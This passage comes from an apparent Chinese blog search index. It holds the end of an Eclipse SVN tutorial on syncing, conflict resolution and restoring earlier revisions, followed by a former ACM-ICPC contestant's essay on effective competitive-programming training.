src="./58.png" alt="图10-2-4"></p><p><img src="./59.png" alt="图10-2-5"></p><p>然后弹出下图的界面，勾选全部，点击OK按钮。</p><p><img src="./60.png" alt="图10-2-6"></p><p>切换回到“SVN资源库”标签，右击刚才所上传到的SVN资源库，选择“刷新”，则可看到刚才上传的项目，上传成功。</p><p><img src="./61.png" alt="图10-2-7"></p><hr><h3 id="10-3-本地代码与服务器代码的更新和冲突处理"><a href="#10-3-本地代码与服务器代码的更新和冲突处理" class="headerlink" title="10.3. 本地代码与服务器代码的更新和冲突处理"></a>10.3. 本地代码与服务器代码的更新和冲突处理</h3><p>在说明更新和冲突处理之前，先解释一下各种SVN图标含义。</p><p>当本地的项目是从SVN服务器上更新下来的时候，若本地或SVN服务器的代码有被修改过，则当进行如此操作时：在“Project Explorer”标签的本地项目上点击右键  Team  与资源库同步（“与资源库同步”仅是在本地和服务器进行比对，暂时并不会使得本地或服务器代码有任何改变）。</p><p>这时会在“Synchronize”标签中列出本地与SVN服务器上不一致的文件列表。文件列表中各个文件的右方会根据不同的情况出现不同的Icon（即SVN图标），它们的含义分别为：</p><ul><li><img style="float: left; box-shadow: 0; margin: 0;" src="./62.png">灰色向右箭头：本地修改过；</li><li><img style="float: left; box-shadow: 0; margin: 0;" src="./63.png">蓝色向左箭头：SVN上修改过；</li><li><img style="float: left; box-shadow: 0; margin: 0;" src="./64.png">灰色向右且中间有个加号的箭头：本地比SVN上多出的文件；</li><li><img style="float: left; box-shadow: 0; margin: 0;" src="./65.png">蓝色向左且中间有个加号的箭头：SVN上比本地多出的文件；</li><li><img style="float: left; box-shadow: 0; margin: 0;" src="./66.png">灰色向右且中间有个减号的箭头：本地删除了而SVN上未删除的文件；</li><li><img style="float: left; box-shadow: 0; margin: 0;" src="./67.png">蓝色向左且中间有个减号的箭头：SVN上删除了而本地未删除的文件；</li><li><img style="float: left; box-shadow: 0; margin: 0;" src="./68.png">红色双向箭头：SVN上修改过,本地也修改过的文件。</li></ul><hr><h4 id="10-3-1-更新处理"><a href="#10-3-1-更新处理" class="headerlink" title="10.3.1. 更新处理"></a>10.3.1. 更新处理</h4><p>更新主要有两种操作形式：</p><ul><li>（1）从本地提交到服务器；</li><li>（2）从服务器覆盖/更新到本地。</li></ul><p>前者主要用于开发进度的更新，后者主要用于从服务器的备份恢复本地错误。两种操作都比较简单，在核对完本地和服务器代码后，只需在“Synchronize”标签中选中需要更新的文件（或文件夹），然后点击右击，找到“Team”，此时选择“提交”则是进行操作（1），选择“覆盖/更新”则是进行操作（2）。具体要进行哪种操作应该视情况而定，这里不再详细说明。</p><hr><h4 id="10-3-2-冲突处理"><a href="#10-3-2-冲突处理" class="headerlink" title="10.3.2. 冲突处理"></a>10.3.2. 冲突处理</h4><p>产生冲突的原因很多，最普遍的一个原因就是：假设服务器上有源代码x，开发者A从服务器上复制了x的副本x1到本地Ax进行开发，开发者B从服务器上复制了x的副本x2到本地Bx进行开发。</p><p>当开发者A首先完成了他的开发任务时，此时其本地Ax的源代码就是x1*，当他x1*提交到服务器上后，服务器的源代码就被更新为x1*。</p><p>此后开发者B也完成了它的开发任务，此时其本地Bx的源代码就是x2*，当他试图把x2*提交到服务器上时，就出现了冲突。因为此时服务器的代码不再是x，而是被A修改过的x1*。x1*中不但有A增加的代码，原本x中还可能有被A删改过的地方。</p><p>此时B要提交代码x2*，就必须根据服务器的代码x1*先把x2*进行恰当的修改，使得修改后的x2**不但包含B的开发部分，还比包含A开发的x1*部分。</p><p>如下图所示为产生冲突的一种情况，Eclipse的SVN插件自动指出了本地与服务器不同或冲突的部分，B就能根据这些提示在本地进行修改再提交。结合下图在本地进行如下修改：</p><ul><li>（a）本地第6行由于是在本地被无故修改的，因此根据服务器进行恢复</li><li>（b）本地第8行需要保留，因此不修改</li><li>（c）服务器第8行需要被保留，因此复制到本地</li><li>（d）服务器第10行不需要保留，因此不复制到本地</li><li>（e）服务器第12行需要保留，复制到本地</li><li>（f）本地第10行不需要保留，删除</li></ul><p><img src="./69.png" alt="图10-3-2-1"></p><p>修改后如下图所示，此时冲突已解决，本地保存后，右击代码文件 -&gt; Team -&gt; 提交，即可更新到服务器。</p><p><img src="./70.png" alt="图10-3-2-2"></p><h2 id="11-版本控制"><a href="#11-版本控制" class="headerlink" title="11. *版本控制"></a>11. *版本控制</h2><p>版本控制已在 第7.2节 介绍TortoiseSVN的Checkout功能时粗略提及过，本节将详细介绍如何利用Eclipse的SVN插件进行版本控制。TortoiseSVN的版本控制原理雷同，因此不再详细介绍，读者可自行摸索。</p><p>以下为示例。</p><p>如下图所示，首先在Eclipse建立一个新的本地项目“版本控制测试”。</p><p><img src="./71.png" alt="图11-1"></p><p>然后把该项目上传到SVN服务器：右击项目文件夹 -&gt; Team -&gt; Share project。</p><p><img src="./72.png" alt="图11-2"></p><p>然后按下图依次进行操作。</p><p><img src="./73.png" alt="图11-3"></p><p><img src="./74.png" alt="图11-4"></p><p><img src="./75.png" alt="图11-5"></p><p>到这步为止，为当前提交到服务器的项目在“编辑提交注释”一栏中填写版本信息。这步很重要，是作为以后版本控制的依据。</p><p><img src="./76.png" alt="图11-6"></p><p>填写完版本信息后，点击Finish按钮，自动跳转到“Synchronize”标签（同步标签），在同步列表中出现等待同步到服务器的项目。右击“版本控制测试”项目的文件夹，选择“提交”，然后按提示操作即可把“版本控制测试”项目连同其版本信息写入SVN服务器。</p><blockquote><p>若提交对话框的注释栏为空，请重新填写版本信息，也可利用下拉选择。</p></blockquote><p><img src="./77.png" alt="图11-7"></p><p>此时SVN服务器上只有“版本控制测试”项目的1.0版本。</p><p>现在回到本地，现在对本地的“版本控制测试”项目进行修改：</p><p><img src="./78.png" alt="图11-8"></p><p>然后右击项目文件夹，选择“Team”，选择“与资源库同步”。自动跳转到“Synchronize”标签（同步标签）。右击“版本控制测试”项目的文件夹，选择“提交”。在出现的提交界面中填写新的版本号。</p><p><img src="./79.png" alt="图11-9"></p><p>确认上传后，现在SVN服务器已经有了“版本测试控制”项目的1.0版本和2.0版本。虽然在SVN资源库中依然只有一个“版本测试控制”项目，这是因为SVN资源库默认是显示项目的最新版本。</p><p><img src="./80.png" alt="图11-10"></p><p><strong>注意</strong>此时服务器上有两个版本1.0和2.0，而本地上只有最新的版本2.0。</p><p>下面我们试图把本地的版本恢复到1.0：</p><p>在资源库中右击“版本控制测试”，选择“检出为”。</p><p>可以看到“Check out HEAD revision”默认是被勾选的，表示从服务器检出最新版本（当前为2.0）的项目到本地。</p><ul><li>“Depth”为检出深度，默认为选中的整个资源文件，按需设置，这里为默认值。</li><li>“Check out HEAD revision”下方有“Revision”，这里是填写希望检出的版本号，这里先不急着填，先点击“显示日志”。</li></ul><p><img src="./81.png" alt="图11-11"></p><p><img src="./82.png" alt="图11-12"></p><p><img src="./83.png" alt="图11-13"></p><p><img src="./84.png" alt="图11-14"></p><p>如上面几张图所示，可以看到点击“显示日志”后，出现了关于项目“版本控制测试”的修改日志列表，日志列表下方对应的是当前被选中的版本号的详细修改信息。但是出现了两个“最初版本1.0”和一个“版本2.0”。现在希望把本地项目恢复到1.0版本，应该选择哪个呢？</p><p>不难发现，最底下的“最初版本1.0”的修改信息只有1个空文件夹，那是之前我们把项目第一次同步到服务器时产生的：我们实际上分开了两步上传，先在服务器创建了项目文件夹，然后再上传项目文件，而这两次操作我们都编写了同一个版本号信息，因此会出现这种情况。</p><p>而中间的“最初版本1.0”的修改信息则是整个项目的内容，那么显然现在我们要恢复到的是中间的“最初版本1.0”，即修订号为85的版本。</p><p>至于“版本2.0”的修改信息只有“VersionTest.java”一个文件，这也是因为我们只对这个文件做了修改的缘故。</p><p>现在我们选择“最初版本1.0”（修订号为85）的版本，点击OK按钮。自动返回到检出界面，而“Check out HEAD revision”已不再被勾选，“Revision”一栏自动被填写了对应修订号85。点击Finish按钮，提示覆盖本地项目，点击OK按钮即可。</p><p><img src="./85.png" alt="图11-15"></p><p><img src="./86.png" alt="图11-16"></p><p>返回本地项目查看，已被恢复至1.0版本（如下图）。</p><p><img src="./87.png" alt="图11-17"></p><p>类似地，现在也可以从服务器中把最新的版本2.0重新检出到本地，方法一样，具体步骤不再阐明。</p><p><img src="./88.png" alt="图11-18"></p><hr><h2 id="资源下载"><a href="#资源下载" class="headerlink" title="资源下载"></a>资源下载</h2><ul><li><a href="http://download.csdn.net/download/lyy289065406/4128863">本文全文下载</a></li><li><a href="http://download.csdn.net/download/lyy289065406/10533477">配套PPT讲义下载</a></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 软件配置管理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 版本控制 </tag>
            
            <tag> SVN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一位 ACMer 过来人的心得</title>
      <link href="/articles/insights/yi-wei-acmer-guo-lai-ren-de-xin-de/"/>
      <url>/articles/insights/yi-wei-acmer-guo-lai-ren-de-xin-de/</url>
      
        <content type="html"><![CDATA[<p>刻苦的训练我打算最后稍微提一下。主要说后者：什么是有效地训练？</p><p>我想说下我的理解。</p><p>很多ACMer入门的时候，都被告知：要多做题，做个500多道就变牛了。其实，这既不是充分条件、也不会是必要条件。</p><p>我觉得一般情况下，对于我们普通学校的大学生，各方面能力的差距不会太大，在这种情况下，训练和学习的方法尤为重要。</p><p>其实，500题仅仅是一个标志，而且仅仅表示你做 ACM-ICPC 有一定的时间。</p><p>我们训练的目的是什么？我觉得有四点：</p><ul><li>提高编程能力</li><li>学习算法（读书，读论文，包括做一些题目验证）</li><li>准备好面临将到来的挑战（熟悉题型，调整心态）</li><li>启发思维</li></ul><p>这里四个目的，从训练的角度上，重要性逐次递减；为什么呢？</p><p>因为前面的因素是后面的基础。而是后面的目的，想达成越为不易。我觉得前3者能保证你ac掉你能做的题，即使难题始终不会做，也可以ac掉中等偏难的题目。</p><p>而需要一定思维难度的题，要以前三者为基础而且属于训练的后期，中期只能作为偶尔调节。当然，我思维也烂得要死，对这点没什么发言权，大家可以鄙视我。</p><p>我这里想主要说下第2点。</p><p>对于算法，我发现，很多我们这样的弱校ACMer选手没有侧重好算法的学习。</p><p>下面要讲的几点，可能都很老套，但我想以035对比我自己的例子给大家做说明。</p><h2 id="算法学习是ACM比赛所要推广或者要提倡的一个方面"><a href="#算法学习是ACM比赛所要推广或者要提倡的一个方面" class="headerlink" title="算法学习是ACM比赛所要推广或者要提倡的一个方面"></a>算法学习是ACM比赛所要推广或者要提倡的一个方面</h2><p>记得曾经路过某人的blog，上面说他作比赛的时候遇到了一个dijkstra，他没做出来，然后评论到（大意）：我才不会花时间去搞明白“这种”算法。 “这种”也许有可能是指：没什么实用性，对吧，这样我就不想评论了（又是有关科学和工程的讨论）。但起码有一点需要明确的：ACM-ICPC比赛时关于计算机科学的比赛，计算机科学是算法的科学，计算机算法中dijkstra有着重要的实际和启发意义，所以比赛一定要考。</p><p>你参加这个比赛，要拿奖，就必须学习这种算法。你也许觉得你智商很高，但ACM-ICPC比赛本身不是智力比赛，比赛就是要让你去学习这些东西，所以，如果你不想学的话，我觉得也没有必要参加。说道这，可能偏题有点远，但是希望以上的分析能得出这样一个基础结论：不想学好算法，那没有必要来比赛。</p><h2 id="用模板是不好的"><a href="#用模板是不好的" class="headerlink" title="用模板是不好的"></a>用模板是不好的</h2><p>现在很多我们弱校的ACM-ICPC选手比较依赖模板，说实话，我也很依赖，但是我起码知道一点，这样是不对的，某种意义上说，这是你没有把算法学明白的一种表现。而且也严重影响编码速度。在我见过的huicpc035参加过的比赛中，他从来没有看过模板，全部现场敲，有一次比赛有个图强连通分量+缩点+染色+什么的题去了，我在他们机房做，我则抄模板，结果总共敲了1个半小时，而035明确算法之后，啪啦啪啦，估计30多分钟就敲完了。这里顺便八卦一下他：我和kevin以前去湖大集训队玩的时候，给他取了个外号——打字猛男（他应该还不知道）。因为他敲键盘的声音特别大特别快，呵呵。</p><p>我觉得他敲代码的时间没有浪费，某牛曾说：因为每次敲都有可能有不同的错误，所以不用模板是好习惯。我最开始学dancing link的的时候，自己敲出了代码，然后接下来的几道题部分参考了以前的代码，后来基本上是直接copy。现在，当别人问我dancing link算法或有关的题目的时候，我已经是一脸茫然。</p><p>所以，用模板是不好的，有时候由于某些原因可能你用了模板，但你起码要知道这要做是不对的，并且有机会要改正。</p><h2 id="需要深入学习"><a href="#需要深入学习" class="headerlink" title="需要深入学习"></a>需要深入学习</h2><p>像 ACRush、zzy、ahyangyi…等等国家队的天才们，本身难以说我们与他们之间有什么可比性。但是他们的学习方法应该还是值得借鉴的，他们的学习方法当然我们得不到言传身教，但是从他们在国家队集训的论文中和他们搞完ACM-ICPC以后的轨迹中，可以有所体现。那就是：深入学习。</p><p>其实这点我来讲可能还是不够有力，因为我这方面也很欠缺，我尽量说下我的想法。</p><p>首先，觉得ACMer学算法不应停留在看看代码实现这个层面，在算法思想上要有清醒的认识，在正确性分析上要也应该要有较好的逻辑。因为网上的代码的实现上的一些细枝末节很可能掩盖了算法本身有的简洁性、美感和思想。因而丧失了对算法整体上的一些认识。还拿dijkstra算法打比方，有些算法不是基于 dijskstra的直接建模，而是需要你修改这个算法，这时你对算法没有真正理解的话，也就一筹莫展了。</p><p>我为什么老说Dijkstra算法，因为确实很多人都只知道用模板，而且模板还不好，在我看到的Dijkstra实现中，只有czyuan_acm的代码写得好。不是说其他的不对，但确实是有问题，投机取巧了的。</p><p>所以，要阅读论文和书籍，尤其与英文书籍，窥到它的本质。另一方面，只有这样，你学的的东西才能在ACM-ICPC以外，给你一定的启发——否则你会迅速忘掉它的。</p><p>据我所知，035起码阅读了几十篇集训队论文，orzorzorz，而且切掉了例题。</p><h2 id="独立思考"><a href="#独立思考" class="headerlink" title="独立思考"></a>独立思考</h2><p>这点我也很惭愧，因为我也是缺乏独立思考的。很多题我不会了就去搜解题报告，所以反而我的搜资料能力变得特别强。035和许多大牛在这点上做的比我好多了，他们遇到题不会的时候，也不会很急于把题目做出来，可能每隔一段时间又拿出来想一次，总有一天想通了，之后这一类型的题目基本上也就没有什么问题了。</p><p>而我恰恰比较“虚荣”，做到的题目不会不太愿意想太久，就想尽量快些AC，于是急于看解题报告，这样导致的一个问题就是有些重要的东西解题报告中没有提到，而我也没去想就把他们忽略了，这样，我还是不会做。我和035讨论问题的时候，我不会一般就直接找他要代码，但是他不懂的时候，顶多问我大体的思路，而绝对不会要代码的。</p><p>在去年ACM赛区尾声的时候，我发现035做中难题的能力已经明显超过我一个档次。看他现在做的题目，已然是相当变态，几乎是都100以下人ac，这些题目我看了基本上没什么想法，更要命的时，解题报告也搜不到。035目前的状态让我想起一个人，不知道大家知道不：wangfangbob，他切bt题的能力也是令人汗颜的。</p><h2 id="做有意义的题"><a href="#做有意义的题" class="headerlink" title="做有意义的题"></a>做有意义的题</h2><ul><li>不要做水题，这里的水题定义为：一眼就能看出做法，而且中途的实现可以预计没有太多问题的题目。</li><li>做能够强化你最近学到的东西的题目</li><li>你不会但你应该会的题目</li></ul><p>这同时也是在说，某些没太多代表性的题目可以少做，因为对比赛帮助不大。（当然我这个参加比赛的目的很功利，非功利主义者另当别论）刚才，我把我在poj上的号和他的号对比了下，他ac而我没ac的基本上是难题，我ac他没ac的一般是水题，看得我想哭，5555。</p><p>补充一点：ac的人多的并不一定代表着水题，有些几千人ac的题目，在现场赛中ac的人很少，这样的题目往往是有一定思维难度且编码不难的好题，这种题目要认真做，某个学长说：经典的题目啊，只有那么多，做一道，就少一道。</p><h2 id="估算好某种训练所需要的时间"><a href="#估算好某种训练所需要的时间" class="headerlink" title="估算好某种训练所需要的时间"></a>估算好某种训练所需要的时间</h2><p>我觉得我学网络流就是一个例子，我在大概赛区赛之前2个月开始学习网络流，1个月前开始学习费用流，但是对于我来讲，这两个月培养出来的网络流思维还是不够（虽然也做了不少题），特别是，这种题目往往作为中难的题目出现，不会让你随便水的，于是，北京赛区的那道网络流当时就没有想出来——功利地说，学习网络流没有得到好的效果。</p><p>所以，现在来看，当时其实我可以不搞网络流。如果要学一种比较有难度的东西，并且还必须把他搞好，应该较早地，全面地学习，必须长期的训练以培养这种思维。打个比方，如果你微积分平时不学，仅仅考试前一周狂做题目，我觉得上90分是很困难的。</p><p>当然，这要根据个人情况而定，我的理解能力应该说是中等水平，如果牛的话应该可以更快地学好。</p><h2 id="有关训练的度"><a href="#有关训练的度" class="headerlink" title="有关训练的度"></a>有关训练的度</h2><p>我有时候通宵刷体，这里我不知道huicpc035有没有这个习惯，不过我通宵的时候没见到他通宵。<br>我觉得其实通宵刷体，或者太长时间地做题，还是不好的。我们为什么会这样有热情的做题呢，因为我们有兴趣；但是一个人的成功不仅仅依赖于兴趣，还要依赖于自控。这和打游戏是一个道理，游戏太有趣以至于我们常常通宵——ICPC题目也太有趣，所以有时候通宵。而且很多时候是，由于一道题AC不掉，所以赌气一定要搞定才睡觉，这样一不小心，就通宵了。</p><p>其实我明白，通宵不一定效果好，这仅仅说明了你兴趣很高涨而已。通宵往往会打乱你的时间安排，打乱你的生物钟，进而影响你短期或是中期的训练计划。而且，疲惫的状态下做题，你往往只有ac题目的欲望，而完全丧失了ac题目的灵气。所以，我建议，ACMer一定要合理安排作息，能够自控，这样不仅仅对你做 ACM-ICPC有好处。</p><p>总之，有效训练是很重要，只有通过有效的训练你才能获得你参加这个比赛应得的东西。</p><p>还有就是，除了035以外，另一个值得大家学习的就是richardxx——我也很佩服，我并不觉得他是天才，我觉得他以全方位的努力让他自己变得优秀，大家看他的blog可以看到他的学习历程。</p><p>最后要说下刻苦训练这一点，这个我主要想说给我们学校的acm队员：</p><p>客观的说，我们学校很多名校落榜生（我相比而言是水进的）。确实都蛮聪明的，但再聪明也比不上ACRush吧？人家可是SGU都切满了！ACM不是智力测试，不是你什么都不做就可以天上掉馅饼的。当然我不是说题目一定要做多少多少道，但如果你觉得你可以一心二用，从概率上来讲，你百分之九十地错了，我是个工科生，我相信概率而非奇迹。</p><p>我觉得035这方面也是值得我们学习的，我比较喜欢扯淡，有时候聊题目的时候也经常不小心就去扯其他话题去了，在学习的时候，035是坚决不多聊乱七八糟的东西的，除了讨论上QQ，平时据我观察都是残酷地训练。现在回想起来，我有点后悔，QQ上和网上花掉的时间用来学习新的东西，也许结果会更好。</p><p>ACM-ICPC绝不是大学生活的全部，也不是搞算法的全部，你大可以花时间去做其他研究，做项目，或者参加学生工作(我更欣赏那些对人生和职业有良好规划的ACMer)；但是，如果你搞ICPC的那段时间你不是全部投入，那的在ACM-ICPC生涯中，将只有后悔。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> 算法 </tag>
            
            <tag> 训练 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
